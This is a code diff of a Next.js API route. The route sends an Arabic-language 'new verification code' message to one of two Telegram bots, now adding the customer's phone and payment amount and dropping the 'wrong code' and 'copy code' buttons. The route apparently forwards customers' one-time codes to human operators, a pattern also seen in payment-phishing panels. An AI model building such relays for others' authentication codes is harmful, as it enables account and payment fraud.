@@ -56,12 +56,16 @@ export async function POST(req: NextRequest) {
   // Determine target bot according to live distribution system (Bot 1 or Bot 2)
   const targetBot = getOrderBot(cleanOrderId);
 
-  const text = [
+  const lines = [
     `🔐 كود تحقق جديد`,
     `🆔 رقم الطلب: ${cleanOrderId}`,
     `👤 اسم العميل: ${customerName || "—"}`,
-    `📟 الكود: ${code}`,
-  ].join("\n");
+  ];
+  if (phone) lines.push(`📱 الهاتف: ${phone}`);
+  if (amount) lines.push(`💰 المبلغ: ${amount}`);
+  lines.push(`📟 الكود: ${code}`);
+
+  const text = lines.join("\n");
 
   const sent = await sendTelegramMessage(targetBot, {
     text,
@@ -69,10 +73,6 @@ export async function POST(req: NextRequest) {
       inline_keyboard: [
         [
           { text: "✅ تأكيد الطلب", callback_data: `v_app_${cleanOrderId}` },
-          { text: "❌ كود خاطئ", callback_data: `v_rej_${cleanOrderId}` },
-        ],
-        [
-          { text: `📋 نسخ الكود`, copy_text: { text: String(code) } },
         ],
       ],
     },
